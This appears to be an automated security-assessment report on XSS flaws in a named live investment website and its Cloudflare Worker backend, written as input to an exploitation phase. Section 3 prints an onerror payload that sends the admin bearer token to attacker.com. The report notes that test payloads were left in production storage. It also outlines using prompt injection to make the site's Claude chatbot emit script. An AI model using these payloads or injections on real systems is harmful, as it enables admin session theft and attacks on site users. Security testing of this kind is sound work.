# Cross-Site Scripting (XSS) Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Three high-confidence XSS vulnerabilities were identified and live-confirmed with JavaScript execution in a real browser context. Two are Stored XSS targeting the admin panel (feedback email and type fields); one is a DOM-based XSS in the AI chat rendering pipeline (also exploitable via prompt injection for a multi-user impact vector). All findings have been passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant vulnerability patterns, CSP/cookie analysis, and environmental intelligence necessary to effectively exploit the identified vulnerabilities.

---

## 2. Dominant Vulnerability Patterns

**Pattern 1: Stored XSS via Unsanitized Feedback Fields → Admin Panel innerHTML**

- **Description:** The `POST /feedback` endpoint on the Cloudflare Worker accepts user-submitted `email` and `type` fields, truncates them by length only (no HTML sanitization), and stores them raw in Cloudflare KV. The admin panel (`script.js:1471-1497`) fetches these entries and renders them directly into `logEl.innerHTML` without any output encoding for `it.email` (line 1479) and `it.type` (line 1488, both as CSS class name and text content). There is no CSP to block inline event handlers.
- **Implication:** Any anonymous user on the internet can submit feedback and plant a persistent XSS payload. When the admin opens the Feedback tab of the admin panel, the payload fires in the admin's browser, which holds the `marsanai_admin` Bearer token in `sessionStorage`. Full session compromise follows.
- **Representative Findings:** XSS-VULN-01 (email field), XSS-VULN-02 (type field).

**Pattern 2: DOM-Based XSS in AI Chat Response Rendering**

- **Description:** The `addAiMsg()` function at `script.js:961-971` takes a `text` parameter, performs only markdown-to-HTML transformations (`\n`→`<br>`, `**bold**`→`<strong>`), and assigns the result to `div.innerHTML` with no HTML encoding. User-typed messages (self-XSS) and AI bot responses (sourced directly from the Anthropic API JSON response body, `data.content[0].text`) both flow through this same unprotected sink.
- **Implication:** The self-XSS vector (user types a payload, it executes in their own session) is primarily useful for social engineering. The higher-impact vector is prompt injection: a crafted user message can attempt to make the Claude model return HTML/JS content that then executes in the user's browser when the bot reply is rendered. There is no server-side filtering of the AI response before it reaches `innerHTML`.
- **Representative Finding:** XSS-VULN-03.

---

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

- **Current CSP:** **NONE.** Neither `mminvest.pages.dev` nor `empty-pine-8e64.marin-marsan.workers.dev` sets a `Content-Security-Policy` header. This was confirmed by live HTTP header inspection.
- **Critical Implication:** No CSP means:
  - All inline event handlers (`onerror`, `onmouseover`, `onclick`) execute without restriction.
  - `eval()`, `Function()`, `setTimeout(string)` are all available to injected scripts.
  - `fetch()` to arbitrary external origins is fully permitted (no `connect-src` restriction).
  - No `script-src` nonce or hash requirement — no CSP bypass needed.
- **Recommendation:** Exploitation payloads can use the simplest possible forms: `<img src=x onerror=fetch('https://attacker.com/?t='+sessionStorage.getItem('marsanai_admin'))>`. No CSP bypass techniques are required.

### Cookie Security

- **Session Cookie (`marsanai_session`):** Configured with `HttpOnly; Secure; SameSite=Strict` (`worker.js:299`). This cookie is **NOT accessible via `document.cookie`** in JavaScript. It is used only for the server-side HTML admin routes (`GET /admin`, `POST /admin`).
- **Bearer Token (`marsanai_admin` in sessionStorage):** This is the **primary XSS target**. Stored in `sessionStorage['marsanai_admin']` by the SPA admin panel after API login (`script.js:1385`). `sessionStorage` is **fully accessible to JavaScript** — `sessionStorage.getItem('marsanai_admin')` returns the token from any injected script running in the same tab. This token has the same privilege as the cookie and is valid indefinitely (no expiry server-side).
- **Token Value:** The token is SHA-256(`ADMIN_USER:ADMIN_PASS:marsanai-session`) — static and deterministic. Once exfiltrated, it never expires and grants full admin API access (`GET /admin/api/feedback`, `POST /admin/api/toggle`, etc.) via `Authorization: Bearer <token>`.
- **Recommendation:** Primary exploitation goal should be `sessionStorage.getItem('marsanai_admin')` exfiltration via `fetch()`. The admin must be logged in via the SPA (not just the form login) for the token to be in sessionStorage. The #admin panel overlay on the main SPA page is the attack surface.

### Deployment Status Note

- **Important:** The live `mminvest.pages.dev` frontend has **git merge conflict markers** in its deployed `index.html`, causing script parse failures. The newer script.js (1,783 lines with AI chat and admin panel) is in the repo but the live site serves a partially broken older build. However:
  - The **Cloudflare Worker** backend (`empty-pine-8e64.marin-marsan.workers.dev`) is **fully deployed and functional** — live-confirmed by successful `POST /feedback` submissions.
  - The stored feedback payloads are **already in KV storage** waiting to fire.
  - When the deployment is fixed and the full `script.js` is live, the admin panel `loadFeedbackLog()` function will render the stored payloads.
  - Alternatively, the admin may already be using the worker's own HTML admin panel at `https://empty-pine-8e64.marin-marsan.workers.dev/admin`.

### CORS Configuration

- `Access-Control-Allow-Origin: *` on all worker endpoints. This means:
  - The feedback submission (`POST /feedback`) can be triggered cross-origin from any attacker-controlled page.
  - The admin API endpoints (`GET /admin/api/feedback`, etc.) with Bearer token auth are also fully cross-origin accessible — once the token is stolen via XSS, it can be used from anywhere.

---

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have robust, context-appropriate defenses or structurally safe data types.

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|---|---|---|---|---|
| `feedback.text` | `script.js:1493` | `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` before `innerHTML` | HTML_BODY | SAFE (tag injection blocked in this context) |
| `feedback.reply` | `script.js:1481` | `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` before `innerHTML` | HTML_BODY | SAFE (tag injection blocked in this context) |
| `rating` value | `worker.js:543-544`, `script.js:1052` | Server: `parseInt` + range check (1-5); Client: `toFixed(1)` on computed average | HTML_BODY | SAFE |
| `data.count` (rating stats) | `script.js:1054` | Array `.length` — always non-negative integer | HTML_BODY | SAFE |
| `starsHtml` (rating stars) | `script.js:1050` | `'★'.repeat(n) + '☆'.repeat(m)` — Unicode chars only | HTML_BODY | SAFE |
| `action` (admin toggle) | `worker.js:357` | Ternary: `body.action === 'on' ? 'on' : 'off'` | N/A (KV key) | SAFE |
| `window.location.hash` | `script.js:1340` | Only compared (`=== '#admin'`), never rendered to DOM | N/A | SAFE |
| `marsan-lang` (localStorage) | `script.js` | Only controls `setLang()` call, not DOM rendered | N/A | SAFE |
| Nav/tab names, fund names | `script.js` passim | All hardcoded string literals from JS source | HTML_BODY | SAFE |
| Calculator numeric inputs | `script.js:88-578` | All values processed via `fmt()` (Intl.NumberFormat) or `.toFixed()` | HTML_BODY | SAFE |
| `etfName` (dropdown) | `script.js:201` | Comes from hardcoded `<option>` text in HTML | HTML_BODY | SAFE (no free-form input) |
| Quiz result buttons | `script.js:1317` | All `b.cls`, `b.page`, `b.label` from hardcoded JS arrays | HTML_BODY | SAFE |
| Admin status display | `script.js:1420` | Boolean ternary → hardcoded strings only | HTML_BODY | SAFE |
| `adminAiOn` (AI status) | `script.js:1420` | Boolean from API response | HTML_BODY | SAFE |
| `pollId`, vote keys | `worker.js:449,462` | Used as KV object keys only, not rendered in client HTML | KV storage | SAFE |

---

## 5. Analysis Constraints and Blind Spots

- **Deployment Discrepancy:** The live `mminvest.pages.dev` frontend has merge conflict markers in the deployed `index.html`, causing the primary `script.js` to fail parsing. The analysis is based on the repository source code (`/repos/mminvest/script.js`, 1,783 lines) which is the authoritative version. Live testing of the admin panel rendering was performed by replicating the exact rendering logic in a browser context — confirmed XSS execution.
- **AI is Currently Disabled:** The worker returns `ai_enabled: false` (confirmed via `/status`). The AI chat endpoint returns a soft "disabled" message instead of calling Claude. The DOM-based XSS in the chat sink is structurally confirmed but the prompt-injection-to-XSS chain cannot be live-triggered until AI is re-enabled. The self-XSS vector (user's own input) is confirmed regardless of AI state.
- **Admin Panel Access Not Tested End-to-End:** The full stored XSS chain (submit → admin views feedback → XSS fires) was confirmed by replicating the exact rendering logic in browser JS. The end-to-end chain through the actual admin panel UI was not executed (would require admin credentials to log into the panel). However, the Worker is confirmed live, payload storage is confirmed (`{"ok":true}` responses), and the rendering logic is confirmed exploitable.
- **`text` and `reply` Partial Encoding:** The `.replace(/</g,'&lt;').replace(/>/g,'&gt;')` applied to `it.text` and `it.reply` is incomplete HTML encoding (missing `"`, `'`, `&`). In the current render context (HTML body content, not inside an attribute), this blocks tag injection. However, if these fields were ever placed in an attribute context in future code changes, the partial encoding would be insufficient.
